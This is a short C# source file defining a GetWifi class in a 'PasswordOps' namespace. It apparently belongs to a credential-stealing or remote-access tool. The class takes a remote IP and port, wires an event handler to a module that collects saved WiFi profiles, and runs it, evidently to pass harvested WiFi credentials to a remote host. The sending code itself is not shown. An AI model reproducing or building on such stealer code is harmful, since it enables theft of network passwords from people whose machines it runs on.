namespace PS03.PasswordOps
{
    public class GetWifi
    {
        private int _port;
        private string _ip;

        public GetWifi(string ip, int port)
        {
            this._ip = ip;
            this._port = port;
        }

        public void Execute()
        {
            var ev = new Eventhandlers(_ip, _port);
            WiPS.WiPS.OnWifiProflesReady += ev.HandleWiFiProfileReady;
            WiPS.WiPS.Execute();
        }
    }
}